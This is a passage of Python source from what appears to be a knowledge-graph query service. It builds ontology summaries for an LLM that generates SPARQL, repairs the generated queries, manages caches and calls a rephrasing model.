                            a_uri = _attr_uri_for(type_layers[tl], tl, attr_name)
                            entry = f"{attr_name} ({dtype}) — URI: <{a_uri}>"
                            if entry not in types[tl]["attributes"]:
                                types[tl]["attributes"].append(entry)
                    if row.get("funcName"):
                        types[tl]["functions"].add(row["funcName"])

            # ── Which declared types carry instances? (ONTA-258 signal) ──────
            # This used to run BEFORE the schema read, as one unbounded
            # `SELECT DISTINCT ?type` over the entire instance graph: a full scan
            # of the KG's rdf:type index on every ontology fetch. Because
            # `refresh_after_write` invalidates the ontology cache after EVERY
            # converged write, an active ingest meant essentially every /ask paid
            # for that scan, and paid for it while the same graph was being
            # written (ONTA-427).
            #
            # Now that `types` is known we ask the question the "[no instances]"
            # annotation actually needs, "does THIS declared type have at least
            # one instance?", as one LIMIT-1 index probe per candidate URI. The
            # signal is IDENTICAL (same name-based matching, same layer
            # namespaces, no caching, no staleness added); only the cost changes,
            # from O(entities in the KG) to O(declared types).
            #
            # NOT derived from the Explorer type-stats that `refresh_after_write`
            # already recomputes, even though those carry per-type entity counts:
            # they are fire-and-forget and best-effort (a failed recompute is
            # swallowed), they only cover the tenant type namespace, and their
            # scan applies a PRIMARY-type guard that attributes each entity to a
            # single type, so an entity asserting both a subtype and its
            # supertype contributes to only one of them, and the other would read
            # as 0 instances. Any of those would produce a FALSE "[no instances]"
            # on a populated type, which is precisely the ONTA-258 failure.
            #
            # Shared with the semantic-retrieval path through one TTL cache
            # (ONTA-411) so both build the SAME notion of "in scope for THIS
            # graph" from one probe rather than each running their own.
            if instance_graph and instance_graph != graph_uri:
                active_key = _active_types_cache_key(instance_graph, types)
                cached_active = _active_types_cache.get(active_key)
                # `cached_active[0]` for the same reason `_active_types` checks it:
                # an EMPTY probe result is exactly the "might be mid-ingest" case,
                # and serving it for the rest of the TTL would mark every declared
                # type "[no instances]" on a KG that has just been populated.
                if (
                    cached_active
                    and cached_active[0]
                    and (time.time() - cached_active[1]) < ONTOLOGY_CACHE_TTL
                ):
                    active_types = cached_active[0]
                else:
                    active_types, scanned_instance_types = await self._resolve_active_types(
                        instance_graph, types
                    )
                    _store_active_types(active_key, active_types)

            # A DECLARED type with no correctly-typed instances in the queried KG
            # is KEPT and annotated "[no instances]" — NOT dropped (ONTA-258).
            # This mirrors the ONTA-248 treatment of declared-but-empty
            # attributes/relationships further down. Hiding a declared type made
            # it indistinguishable from a nonexistent one, so the SPARQL-
            # generating LLM asserted "that type doesn't exist" (or silently
            # queried the closest wrong type) instead of returning an honest
            # zero-row answer. `active_types` still scopes which types carry
            # instance data — it no longer decides a declared type's VISIBILITY.
            empty_types: set[str] = (
                {tl for tl in types if tl not in active_types}
                if active_types is not None else set()
            )
            # Declared types that actually carry instances in this KG. When this
            # is zero we fall through to the SAME instance-graph fallback /
            # ONTOLOGY_EMPTY handling as before (ONTA-248): a schema that shares
            # NO type with the instance data is the "schema missing" case, and a
            # summary of only [no instances] types would be worse than the
            # instance-derived fallback.
            active_matched = len(types) - len(empty_types)

            if active_matched == 0:
                # No DECLARED type carries instances in this KG (the schema query
                # returned nothing, or nothing that overlaps the instance data).
                # When querying a SPECIFIC KG (distinct instance graph), that can
                # mean two very different things which look identical here:
                #  (a) instances exist but the base-graph schema hasn't been
                #      written yet (fresh ingest, schema-write lagging) — a basic
                #      "list all X" ask SHOULD still work, so fall back to the
                #      types present in the instance data and emit a distinct
                #      diagnostic instead of the misleading "No ontology" text.
                #  (b) the KG is genuinely empty — keep the original message.
                # This fallback needs EVERY type present in the data, including
                # ones the schema never declared, so it is the one caller that
                # genuinely requires the unbounded scan (the bounded probe only
                # answers about DECLARED types). Run it here rather than on every
                # fetch: reaching this branch at all means no declared type is
                # populated, i.e. the rare cold-start / disjoint-schema case, not
                # the hot path. Reuses the scan if the probe already fell back to
                # it, so this never costs two scans. Only attempt this for a
                # distinct instance graph; a bare tenant/ontology graph with no
                # schema genuinely has no ontology.
                if instance_graph and instance_graph != graph_uri:
                    if scanned_instance_types is None:
                        scanned_instance_types = await self._scan_instance_types(
                            instance_graph
                        )
                if scanned_instance_types:
                    fallback = await self._instance_graph_ontology_fallback(
                        graph_uri, instance_graph, scanned_instance_types
                    )
                    if fallback is not None:
                        summary, has_instances = fallback
                        if has_instances:
                            logger.info(
                                "ontology_schema_missing_instances_present",
                                graph_uri=graph_uri,
                                instance_graph=instance_graph,
                                instance_types=len(scanned_instance_types),
                            )
                            _ontology_cache[cache_key] = (summary, time.time())
                            return summary
                return ONTOLOGY_EMPTY

            # Discover enumerated values for low-cardinality string attributes.
            # Runs cardinality checks concurrently (asyncio.gather) instead of
            # serially, cutting ontology fetch from ~7s to ~500ms. Concurrency
            # is bounded by a semaphore (COG-58) so a wide table with hundreds
            # of attributes can't launch hundreds of simultaneous queries
            # against serverless Neptune — the count stays capped regardless of
            # column count.
            import asyncio
            MAX_ENUM_CARDINALITY = 25
            _enum_sem = asyncio.Semaphore(MAX_ENUM_DISCOVERY_CONCURRENCY)

            async def _gather_bounded(coros: list) -> list:
                """asyncio.gather, but each coroutine acquires the shared enum
                semaphore first so at most MAX_ENUM_DISCOVERY_CONCURRENCY run at
                once. Preserves return_exceptions semantics for callers."""
                async def _run(coro):
                    async with _enum_sem:
                        return await coro
                return await asyncio.gather(
                    *[_run(c) for c in coros], return_exceptions=True
                )
            enum_values: dict[str, dict[str, list[str]]] = {}
            enum_counts: dict[str, dict[str, int]] = {}
            empty_rels: set[tuple[str, str]] = set()
            if instance_graph:
                # Collect all attribute and relationship URIs for cardinality checks
                all_attrs: list[tuple[str, str, str]] = []  # (type_name, attr_name, uri)
                string_attrs: list[tuple[str, str, str]] = []  # string attrs only (for enum values)
                rel_uris: list[tuple[str, str, str]] = []  # (type_name, rel_name, onto_uri)
                for type_name, info in types.items():
                    # Empty declared types have zero instances by definition, so
                    # every cardinality COUNT would return 0 — skip the probes
                    # (no extra Neptune round-trips) and render their declared
                    # schema plainly under the type-level [no instances] mark.
                    if type_name in empty_types:
                        continue
                    t_layer = type_layers.get(type_name, Layer.TENANT)
                    for attr_entry in info["attributes"]:
                        a_name = attr_entry.split(" (")[0]
                        a_uri = _attr_uri_for(t_layer, type_name, a_name)
                        all_attrs.append((type_name, a_name, a_uri))
                        if "(string)" in attr_entry:
                            string_attrs.append((type_name, a_name, a_uri))
                    for rel_entry in info["relationships"]:
                        r_name = rel_entry.split(" →")[0].strip()
                        onto_uri = f"{IRI_BASE}/onto/{r_name}"
                        rel_uris.append((type_name, r_name, onto_uri))

                # Define cardinality check function ONCE (used for both attrs and rels)
                async def _count_predicate(tn: str, an: str, uri: str) -> tuple[str, str, int]:
                    count_query = (
                        f"SELECT (COUNT(DISTINCT ?val) AS ?cnt) FROM <{instance_graph}> "
                        f"WHERE {{ ?s <{uri}> ?val }}"
                    )
                    raw = await self.neptune.query(count_query)
                    _, bindings = parse_sparql_results(raw)
                    cnt = int(bindings[0].get("cnt", 0)) if bindings else 0
                    return tn, an, cnt

                # Phase 1: Concurrent cardinality checks for ALL attributes
                if all_attrs:
                    try:
                        count_results = await _gather_bounded(
                            [_count_predicate(tn, an, uri) for tn, an, uri in all_attrs]
                        )

                        low_card_attrs: list[tuple[str, str, str]] = []
                        exceptions = sum(1 for r in count_results if isinstance(r, Exception))
                        if exceptions:
                            logger.warning("cardinality_check_exceptions", count=exceptions, total=len(count_results))
                        for result in count_results:
                            if isinstance(result, Exception):
                                continue
                            tn, an, cnt = result
                            enum_counts.setdefault(tn, {})[an] = cnt
                            if 0 < cnt <= MAX_ENUM_CARDINALITY:
                                t_layer = type_layers.get(tn, Layer.TENANT)
                                low_card_attrs.append(
                                    (tn, an, _attr_uri_for(t_layer, tn, an))
                                )

                        # Phase 2: Concurrent value fetches for low-cardinality attrs
                        async def _fetch_vals(tn: str, an: str, uri: str) -> tuple[str, str, list[str]]:
                            enum_values_query = (
                                f"SELECT DISTINCT ?val FROM <{instance_graph}> "
                                f"WHERE {{ ?s <{uri}> ?val }} LIMIT {MAX_ENUM_CARDINALITY}"
                            )
                            raw = await self.neptune.query(enum_values_query)
                            _, bindings = parse_sparql_results(raw)
                            return tn, an, [r["val"] for r in bindings if r.get("val")]

                        if low_card_attrs:
                            val_results = await _gather_bounded(
                                [_fetch_vals(tn, an, uri) for tn, an, uri in low_card_attrs]
                            )
                            for result in val_results:
                                if isinstance(result, Exception):
                                    continue
                                tn, an, vals = result
                                if vals:
                                    enum_values.setdefault(tn, {})[an] = sorted(vals)
                    except Exception:
                        logger.warning("cardinality_attr_check_failed", exc_info=True)

                # Phase 3: Check relationship cardinality to annotate empty ones.
                # A CONFIRMED-empty relationship is annotated "[no instances]" but
                # NEVER removed (ONTA-248 determinism): a DECLARED relationship is
                # part of the schema, and dropping it on a cnt==0 — which a
                # transient throttle produces exactly like a genuinely-empty edge —
                # made a relationship appear then vanish across identical calls.
                empty_rels: set[tuple[str, str]] = set()  # (type_name, rel_name)
                if rel_uris:
                    try:
                        rel_counts = await _gather_bounded(
                            [_count_predicate(tn, rn, uri) for tn, rn, uri in rel_uris]
                        )
                        for result in rel_counts:
                            if isinstance(result, Exception):
                                continue
                            tn, rn, cnt = result
                            if cnt == 0:
                                empty_rels.add((tn, rn))
                    except Exception:
                        logger.warning("cardinality_rel_check_failed", exc_info=True)

            lines = []
            for type_name, info in types.items():
                # DECLARED-but-empty type: annotate at the type level (ONTA-258)
                # so the LLM writes a valid zero-row query with an honest
                # "declared but no instances" explanation instead of claiming the
                # type is absent or substituting a different type.
                empty_suffix = " [no instances]" if type_name in empty_types else ""
                t_layer = type_layers.get(type_name, Layer.TENANT)
                t_uri = _type_uri_for(t_layer, type_name)
                lines.append(f"Type: {type_name} — URI: <{t_uri}>{empty_suffix}")
                if info["attributes"]:
                    # Prefer populated attrs first; declared-empty trail them
                    # (same planning preference as relationships / GraphStore path).
                    populated_attrs: list[str] = []
                    empty_attrs: list[str] = []
                    for attr_entry in sorted(info["attributes"]):
                        a_name = attr_entry.split(" (")[0]
                        if type_name in enum_values and a_name in enum_values[type_name]:
                            # Low-cardinality: show actual values
                            vals = enum_values[type_name][a_name]
                            val_str = ", ".join(f'"{v}"' for v in vals[:10])
                            if len(vals) > 10:
                                val_str += f", ... ({len(vals)} total)"
                            populated_attrs.append(
                                f"{attr_entry} [values: {val_str}]"
                            )
                        elif type_name in enum_counts and a_name in enum_counts[type_name]:
                            cnt = enum_counts[type_name][a_name]
                            if cnt == 0:
                                # DECLARED attribute with zero instances. Keep it
                                # (do NOT drop) — dropping made the schema the LLM
                                # sees NON-DETERMINISTIC (ONTA-248): a transient
                                # Neptune throttle returns an empty COUNT result
                                # (cnt=0) exactly like a genuinely-empty attribute,
                                # so the attribute flickered in and out of the
                                # summary between otherwise-identical calls. The
                                # attribute is DECLARED in the ontology, so it
                                # exists; annotate it as empty rather than deleting
                                # it, so an existence claim stays stable.
                                empty_attrs.append(f"{attr_entry} [no instances]")
                            elif cnt > MAX_ENUM_CARDINALITY:
                                # High-cardinality: just show the count
                                populated_attrs.append(
                                    f"{attr_entry} [{cnt} unique values]"
                                )
                            else:
                                populated_attrs.append(attr_entry)
                        else:
                            populated_attrs.append(attr_entry)
                    lines.append(
                        f"  Attributes: {', '.join(populated_attrs + empty_attrs)}"
                    )
                if info["relationships"]:
                    # Keep EVERY declared relationship; annotate confirmed-empty
                    # ones instead of hiding them (ONTA-248 determinism).
                    # Prefer populated edges first so the LLM plans on live
                    # leaves before declared-empty dead ends (persona 56a8c2).
                    annotated_rels = []
                    empty_rel_lines = []
                    for r in sorted(info["relationships"]):
                        if (type_name, r.split(" →")[0].strip()) in empty_rels:
                            empty_rel_lines.append(f"{r} [no instances]")
                        else:
                            annotated_rels.append(r)
                    annotated_rels.extend(empty_rel_lines)
                    lines.append(f"  Relationships: {', '.join(annotated_rels)}")
                if info["functions"]:
                    lines.append(f"  Functions: {', '.join(sorted(info['functions']))}")
            summary = "\n".join(lines)
            # Log types that made it into the summary
            types_in_summary = [l.split("—")[0].replace("Type:", "").strip() for l in lines if l.startswith("Type:")]
            logger.info("ontology_summary_built", types_shown=len(types_in_summary),
                        types_active=len(active_types) if active_types else "all",
                        types_with_attrs=len(types),
                        types_empty=len(empty_types),
                        names=types_in_summary[:10])

            # Cache it
            _ontology_cache[cache_key] = (summary, time.time())
            return summary
        except Exception:
            logger.error("ontology_fetch_failed", exc_info=True)
            # Distinct from the empty-graph message: a transient fetch failure must
            # NOT be reported to the LLM as "graph is empty" (ONTA-248 A2).
            return ONTOLOGY_FETCH_ERROR

    async def _instance_graph_ontology_fallback(
        self,
        graph_uri: str,
        instance_graph: str | None,
        active_types: set[str] | None,
    ) -> tuple[str, bool] | None:
        """Build a minimal ontology summary from INSTANCE data when the schema is missing.

        Called only when the base-graph schema query yields zero types. Probes
        the instance graph directly for the types actually present and the
        predicates used on them, so a freshly-ingested KG whose schema hasn't
        been written yet can still answer a basic "list all X" query instead of
        returning the misleading "No ontology defined yet."

        Returns:
          * ``(summary, True)``  — instances exist; `summary` is a minimal
            ontology built from instance types/predicates, prefixed with a
            diagnostic telling the caller the schema isn't available yet.
          * ``(None-sentinel, False)`` i.e. ``("", False)`` — no instances found;
            caller keeps the original "No ontology defined yet." message.
          * ``None`` — probing failed; caller falls back to the default message.

        Best-effort: any error returns ``None`` so /ask never breaks on it.
        """
        target_graph = instance_graph or graph_uri
        pass  # TYPE_URI_PREFIX imported
        from infona_client.graph.ontology_queries import type_uri, attr_uri

        try:
            # Reuse types already discovered upstream when available; otherwise
            # probe the instance graph now.
            type_leaves: set[str] = set(active_types) if active_types else set()
            if not type_leaves:
                type_query = (
                    f"SELECT DISTINCT ?type FROM <{target_graph}> "
                    f"WHERE {{ ?s <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> ?type }}"
                )
                _, type_bindings = parse_sparql_results(await self.neptune.query(type_query))
                for row in type_bindings:
                    t = row.get("type", "")
                    if t.startswith(TYPE_URI_PREFIX):
                        type_leaves.add(t[len(TYPE_URI_PREFIX):])

            if not type_leaves:
                # Genuinely empty — no instances either. Signal "no instances".
                return "", False

            # Collect the predicates actually used on each type's instances so
            # the LLM has concrete URIs to query, even without a schema. Bounded
            # per-type; failures per type are non-fatal.
            lines = [
                "NOTE: The ontology schema for this graph has not been written "
                "yet, but instance data is present. The types and predicates "
                "below were read directly from the instance data. For the full "
                "curated ontology once available, use view_ontology.",
                "",
            ]
            for leaf in sorted(type_leaves):
                lines.append(f"Type: {leaf} — URI: <{type_uri(leaf)}>")
                try:
                    pred_query = (
                        f"SELECT DISTINCT ?p FROM <{target_graph}> WHERE {{ "
                        f"?s <http://www.w3.org/1999/02/22-rdf-syntax-ns#type> "
                        f"<{type_uri(leaf)}> . ?s ?p ?o }} LIMIT 100"
                    )
                    _, pred_bindings = parse_sparql_results(await self.neptune.query(pred_query))
                except Exception:
                    pred_bindings = []
                attrs: list[str] = []
                rels: list[str] = []
                for row in pred_bindings:
                    p = row.get("p", "")
                    if p.startswith(f"{TYPE_URI_PREFIX}{leaf}/attrs/"):
                        a_name = p.rsplit("/", 1)[-1]
                        attrs.append(f"{a_name} — URI: <{attr_uri(leaf, a_name)}>")
                    elif p.startswith(f"{IRI_BASE}/onto/"):
                        r_name = p.rsplit("/", 1)[-1]
                        rels.append(f"{r_name} — predicate URI: <{p}>")
                if attrs:
                    lines.append(f"  Attributes: {', '.join(sorted(set(attrs)))}")
                if rels:
                    lines.append(f"  Relationships: {', '.join(sorted(set(rels)))}")

            return "\n".join(lines), True
        except Exception:
            logger.warning("instance_graph_ontology_fallback_failed", exc_info=True)
            return None

    @staticmethod
    def _fix_attribute_uris(sparql: str, ontology_summary: str) -> str:
        """Fix incorrect URIs in generated SPARQL using the ontology as ground truth.

        This is the post-processing safety net (Fix B). It catches URI mistakes
        the LLM makes despite the prompt telling it to copy-paste exact URIs.

        Strategy:
        1. Extract ALL valid URIs from the ontology summary (attributes + relationships)
        2. Find ALL graph.infona.ai URIs in the SPARQL
        3. For each URI not in the valid set, fuzzy-match against valid URIs
        4. Replace with the best match if similarity is high enough

        Common mistakes this catches:
        - <https://graph.infona.ai/bedrooms> → <https://graph.infona.ai/types/Property/attrs/bedrooms>
        - <https://graph.infona.ai/onto/bedrooms> → <https://graph.infona.ai/types/Property/attrs/bedrooms>
        - <https://graph.infona.ai/types/Property/attrs/property_type> → .../attrs/home_type
        - <https://graph.infona.ai/Property> → <https://graph.infona.ai/types/Property>
        """
        import re
        from difflib import SequenceMatcher

        # Step 1: Build the set of ALL valid URIs from the ontology
        valid_uris: dict[str, str] = {}  # name → full URI

        # Attribute URIs: "attr_name (type) — URI: <https://graph.infona.ai/types/Type/attrs/attr_name>"
        for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+)/attrs/(\w+))>", ontology_summary):
            full_uri = match.group(1)
            attr_name = match.group(3)
            valid_uris[attr_name] = full_uri
            # Also index by type/attr for disambiguation
            valid_uris[f"{match.group(2)}/{attr_name}"] = full_uri

        # Relationship URIs: "predicate URI: <https://graph.infona.ai/onto/pred_name>"
        for match in re.finditer(rf"predicate URI: <({re.escape(IRI_BASE)}/onto/(\w+))>", ontology_summary):
            full_uri = match.group(1)
            pred_name = match.group(2)
            valid_uris[pred_name] = full_uri

        # Type URIs: "Type: TypeName — URI: <https://graph.infona.ai/types/TypeName>"
        for match in re.finditer(rf"URI: <({re.escape(IRI_BASE)}/types/(\w+))>", ontology_summary):
            full_uri = match.group(1)
            type_name = match.group(2)
            if "/attrs/" not in full_uri:  # don't overwrite attr URIs
                valid_uris[type_name] = full_uri

        valid_uri_set = set(valid_uris.values())

        # Step 2: Find and fix all graph.infona.ai URIs in the SPARQL
        def _fix_uri(m: re.Match) -> str:
            uri = m.group(1)

            # Already valid? Keep it.
            if uri in valid_uri_set:
                return m.group(0)

            # Skip known system URIs. attr_meta/ is load-bearing here (ONTA-262):
            # the freshness prompt teaches the planner to CONSTRUCT
            # attr_meta/<Type>/<attr>/verified_at from the type + attribute names
            # — deliberately absent from the ontology summary — so the fuzzy
            # repair below must never "fix" it into some unrelated declared
            # attribute (measured: it cross-wired to a legacy `fax_verified_at`
            # at ratio 0.846 before this skip).
            if any(
                uri.startswith(f"{IRI_BASE}/{p}")
                for p in ("graphs/", "entities/", "functions/", "kgs/", "attr_meta/")
            ):
                return m.group(0)

            # Extract the "name" part from the URI for matching
            # e.g., "https://graph.infona.ai/bedrooms" → "bedrooms"
            # e.g., "https://graph.infona.ai/onto/listed_by" → "listed_by"
            # e.g., "https://graph.infona.ai/types/Property/attrs/property_type" → "property_type"
            parts = uri.replace(f"{IRI_BASE}/", "").rstrip("/").split("/")
            name = parts[-1] if parts else ""

            if not name:
                return m.group(0)

            # Direct name match
            if name in valid_uris:
                return f"<{valid_uris[name]}>"

            # Fuzzy match against all valid URI names
            best_match = None
            best_ratio = 0.0
            for vname, vuri in valid_uris.items():
                # Compare the short name part only
                vshort = vname.split("/")[-1]
                ratio = SequenceMatcher(None, name, vshort).ratio()
                if ratio > best_ratio:
                    best_ratio = ratio
                    best_match = vuri

            if best_ratio >= 0.75 and best_match:
                return f"<{best_match}>"

            return m.group(0)

        return re.sub(rf"<({re.escape(IRI_BASE)}/[^>]+)>", _fix_uri, sparql)

    @staticmethod
    def _fix_common_sparql_issues(sparql: str, ontology_summary: str, alias_map: dict[str, str] | None = None) -> str:
        """Fix common SPARQL generation mistakes that the LLM makes.

        1. Replace `a` shorthand with full rdf:type URI
        2. Replace cross-type attribute URIs (e.g., Person/attrs/name used on a Movie)
           with rdfs:label
        3. Replace overview/description attributes used as display names with rdfs:label
        """
        import re

        RDF_TYPE = "<http://www.w3.org/1999/02/22-rdf-syntax-ns#type>"
        RDFS_LABEL = "<http://www.w3.org/2000/01/rdf-schema#label>"

        # Fix 1: Replace `a` shorthand (only when used as predicate position)
        # Match "?var a <..." or "?var rdf:type <..."
        sparql = re.sub(
            rf'(\?\w+)\s+a\s+(<{re.escape(IRI_BASE)}/)',
            rf'\1 {RDF_TYPE} \2',
            sparql,
        )
        sparql = re.sub(
            r'(\?\w+)\s+rdf:type\s+',
            rf'\1 {RDF_TYPE} ',
            sparql,
        )

        # Fix 2: Replace overview used ONLY when it's the sole "name" variable selected
        # and the entity type has no name attribute. This is conservative to avoid
        # breaking legitimate description/narrative queries.
        # Only replace Movie/attrs/overview when used in a "name-like" position
        overview_pattern = rf'<{re.escape(IRI_BASE)}/types/Movie/attrs/overview>'
        if re.search(overview_pattern, sparql):
            # Check if the query is trying to get movie names (not filtering by overview content)
            # Heuristic: if overview appears in SELECT projection but not in FILTER
            select_part = sparql.split('WHERE')[0] if 'WHERE' in sparql else ''
            filter_uses_overview = 'overview' in sparql.split('FILTER')[1] if 'FILTER' in sparql else False
            if not filter_uses_overview:
                sparql = re.sub(overview_pattern, RDFS_LABEL[1:-1], sparql)

        # Fix 4: Rewrite type-assertion predicates to subclass-closure paths so a
        # query over a parent type returns subtype instances (ADR rule 2).
        # Deterministic, idempotent, no ontology lookup needed.
        from infona_client.graph.ontology_queries import rewrite_type_predicate_to_closure
        sparql = rewrite_type_predicate_to_closure(sparql)

        # Fix 4b: follow sameAs so a query pinning a MERGED-away entity IRI
        # (ONTA-274 / -278) resolves the canonical's facts under either alias.
        # Same deterministic-property-path shape as the closure rewrite above.
        from infona_client.graph.ontology_queries import rewrite_entity_ref_to_sameas_closure
        sparql = rewrite_entity_ref_to_sameas_closure(sparql)

        # Fix 5: resolve attribute aliases (ADR 0002 §7) — a renamed attribute
        # keeps answering through its alias until backfill retires it. A None
        # or empty map (the default) leaves the query untouched.
        if alias_map:
            from infona_client.graph.aliases import rewrite_query_attrs
            sparql = rewrite_query_attrs(sparql, alias_map)

        # Fix 6: normalize freshness-window duration literals to the Neptune-valid
        # datatype. The recency pattern the prompt teaches is
        # `NOW() - "PnD"^^xsd:dayTimeDuration`, which is valid SPARQL 1.1 (and works
        # on spec engines like pyoxigraph) — but Neptune does NOT implement
        # `xsd:dayTimeDuration` arithmetic: `NOW() - "P7D"^^xsd:dayTimeDuration`
        # yields an ERROR/unbound rather than a dateTime, so a comparison against it
        # is an error and the FILTER silently drops EVERY row (and in aggregate /
        # property-path shapes escalates to a hard 400/500). The identical `xsd:duration`
        # subtraction DOES evaluate on Neptune and on pyoxigraph, so rewriting the
        # datatype makes the recency filter work on the deployed backend while staying
        # correct on the spec engine. Idempotent; touches only the duration datatype IRI.
        sparql = _neptune_safe_duration(sparql)

        # Fix 7: prefer types/<T>/attrs/name over rdfs:label for display names when
        # the query already types the subject as <T>. Path-B / CSV-ingested KGs often
        # mint rdfs:label as a slug or numeric id while attrs/name holds the human
        # string — ranking queries then return "eventName: 5" with the right numeric
        # extreme (Eval-MH freeze flaky projection fails). Only rewrites when
        # attrs/name is not already used for that type in the query.
        sparql = _prefer_attr_name_over_rdfs_label(sparql, ontology_summary)

        return sparql

    @staticmethod
    def _ensure_order_by(sparql: str) -> str:
        """Add a deterministic ORDER BY to a plain SELECT so truncation is stable.

        Result rows come back in arbitrary Neptune order, so slicing to a row
        cap (``bindings[:cap]``) cut an essentially random subset — two runs of
        the same question could truncate to different rows. Adding a stable
        ORDER BY over the projected variables makes the cut deterministic
        (same rows every run) and groups like-with-like (e.g. by type then
        label) so a truncated page reads coherently.

        Conservative — leaves the query untouched when ordering would be wrong
        or risky:
        - already has ORDER BY (respect the LLM's / template's intent),
        - is an aggregate (GROUP BY / HAVING) — ordering by raw projected vars
          would be invalid,
        - isn't a SELECT, is a SELECT * (no named vars to order by), or has an
          existing LIMIT/OFFSET (assume intentional shape).
        Ordering is best-effort: any parse hiccup returns the original query.
        """
        import re

        try:
            upper = sparql.upper()
            if "SELECT" not in upper:
                return sparql
            if "ORDER BY" in upper or "GROUP BY" in upper or "HAVING" in upper:
                return sparql
            if "LIMIT" in upper or "OFFSET" in upper:
                return sparql

            # Extract the projected variables from the SELECT clause. Bail on
            # SELECT * (nothing named to order by) or aggregate projections.
            m = re.search(r"SELECT\s+(DISTINCT\s+|REDUCED\s+)?(.*?)\s+WHERE", sparql, re.IGNORECASE | re.DOTALL)
            if not m:
                return sparql
            proj = m.group(2)
            if "*" in proj or "(" in proj:  # SELECT * or has an expression/aggregate/alias
                return sparql
            proj_vars = re.findall(r"\?(\w+)", proj)
            if not proj_vars:
                return sparql

            order_expr = " ".join(f"?{v}" for v in proj_vars)
            # Append ORDER BY at the very end (after the closing WHERE brace and
            # any solution modifiers we already screened out above).
            return f"{sparql.rstrip().rstrip('.')}\nORDER BY {order_expr}"
        except Exception:
            return sparql

    async def _fetch_alias_map(self, graph_uri: str) -> dict[str, str]:
        """Cached attribute-alias map for the tenant ontology graph (ADR 0002 §7).

        Failures degrade to an empty map — alias resolution never blocks /ask.
        """
        cached = _alias_cache.get(graph_uri)
        if cached and (time.time() - cached[1]) < ONTOLOGY_CACHE_TTL:
            return cached[0]
        from infona_client.graph.aliases import fetch_alias_map
        try:
            alias_map = await fetch_alias_map(self.neptune, graph_uri)
        except Exception:
            alias_map = {}
        _alias_cache[graph_uri] = (alias_map, time.time())
        return alias_map

    @staticmethod
    def invalidate_cache(graph_uri: str) -> None:
        """Call after ingestion to clear the cached ontology for a graph."""
        _ontology_cache.pop(graph_uri, None)
        # Also clear any KG-specific cache entries
        keys_to_remove = [k for k in _ontology_cache if k.startswith(graph_uri)]
        for k in keys_to_remove:
            _ontology_cache.pop(k, None)
        # Alias map is keyed by the ontology graph URI alone
        _alias_cache.pop(graph_uri, None)
        # Active-type sets are keyed by the INSTANCE graph, whose URI extends the
        # tenant graph URI (.../graphs/<tenant>/kg/<name>), so the same prefix
        # sweep drops every KG's entry for this tenant. Stale entries here would
        # keep demoting types that an ingest just populated (ONTA-411).
        for k in [k for k in _active_types_cache if k.startswith(graph_uri)]:
            _active_types_cache.pop(k, None)
        # Invalidate embeddings
        svc = get_embedding_service()
        if svc:
            svc.invalidate(graph_uri)

    async def _rephrase_via_openrouter(self, question: str, bindings: list[dict], max_rows: int | None = None) -> str:
        """Generate a 2-3 sentence narrative summary of SPARQL result bindings.

        ``max_rows`` bounds how many rows are fed to the narrative LLM (a
        deliberate sample, not the full answer — the plain-text answer in
        ``_format_answer`` carries all rows up to ANSWER_ROW_CAP). Defaults to
        INFONA_REPHRASE_MAX_ROWS (30) so a wide result can't blow the summarizer's
        context; the truncation is already stated to the model. Now that
        generated SELECTs get a deterministic ORDER BY, this sample is stable
        across runs instead of an arbitrary slice.

        Uses Llama 3.1 8B on Cerebras (via OpenRouter) for fast, cheap rephrase.
        Fails open: returns "" on any error so the main response is never broken.
        """
        if not self._openrouter_key:
            return ""

        if max_rows is None:
            max_rows = int(os.environ.get("INFONA_REPHRASE_MAX_ROWS", "30"))

        # Same hygiene as _format_answer: never feed internal/housekeeping
        # predicate rows (er/*, onto/norm/*, onto/batch_id, …) to the narrative
        # summarizer, or it would describe ER plumbing as business facts.
        bindings = _drop_internal_predicate_rows(bindings)

        try:
            # Build a compact tabular string from bindings
            if not bindings:
                table_str = "(no results)"
                truncation_note = ""
            else:
                rows = bindings[:max_rows]
                if rows:
                    cols = list(rows[0].keys())
                    lines = ["\t".join(cols)]
                    for row in rows:
                        lines.append("\t".join(str(row.get(c, "")) for c in cols))
                    table_str = "\n".join(lines)
                else:
                    table_str = "(no results)"
                truncation_note = (
                    f"\n(Showing {len(rows)} of {len(bindings)} total rows.)"
                    if len(bindings) > max_rows else ""
                )

            system_prompt = (
                "You are an analyst summarizing a database query result. Rules:\n"
                "- Lead with the specific count (e.g. 'Eleven founders match.').\n"
                "- If multiple rows share similar values, find the ONE row that stands out — "
                "different company, different prior company, or different category. "
                "Use that outlier as your hero example with its exact column values.\n"
                "- Keep to 2-3 sentences, max 80 words.\n"
                "- ONLY state facts visible in the rows. Never mix values from different rows.\n"
                "- Trust the row values as literal, authoritative facts. If a column has a value, "
                "that IS the answer for that column — never describe a present value as "
                "'unknown' or 'incomplete' just because it's a short code.\n"
                "- SEC filing type codes are canonical form names (e.g. D means Form D, "
                "10-K means annual report, 10-Q means quarterly, 8-K means material event, "
                "S-1 means IPO registration). State the code as-is — prefixing with 'Form' "
                "is fine; calling it unknown is not.\n"
                "- Do NOT use chatbot phrases like 'Sure!', 'Here you go', 'Great question'.\n"
                "- If the result is empty, say 'No matches found.' and stop.\n"
                "- Speak in plain English, not technical jargon."
            )

            user_prompt = (
                f"Question: {question}\n\n"
                f"Result ({len(bindings)} row{'s' if len(bindings) != 1 else ''}):\n"
                f"{table_str}{truncation_note}\n\n"
                "Summarize this result in 2-3 sentences."
            )

            t_rephrase = time.time()
            rephrase_url = f"{OPENROUTER_BASE}/chat/completions"
            assert_online_url(rephrase_url, purpose="answer rephrase LLM")
            async with httpx.AsyncClient(timeout=10) as client:
                res = await client.post(
                    rephrase_url,
                    headers={
                        "Authorization": f"Bearer {self._openrouter_key}",
                        "Content-Type": "application/json",
                    },
                    json={
                        "model": "meta-llama/llama-3.1-8b-instruct",
                        "messages": [
                            {"role": "system", "content": system_prompt},
                            {"role": "user", "content": user_prompt},
                        ],
                        "max_tokens": 300,
                        "temperature": 0.2,
                        "provider": {
                            "order": ["Cerebras", "Groq", "Nebius"],
                            "allow_fallbacks": True,
                        },
                    },
                )
                res.raise_for_status()
                data = res.json()
                narrative = _require_message_content(data, "openrouter").strip()
                # Stash usage for the enclosing ask() ledger (one pipeline per
                # request; drained immediately after this call returns).
                usage = data.get("usage") if isinstance(data, dict) else None
                self._last_rephrase_usage = {
                    "prompt_tokens": (usage or {}).get("prompt_tokens"),
                    "completion_tokens": (usage or {}).get("completion_tokens"),
                    "total_tokens": (usage or {}).get("total_tokens"),
                    "model": (data.get("model") if isinstance(data, dict) else None)
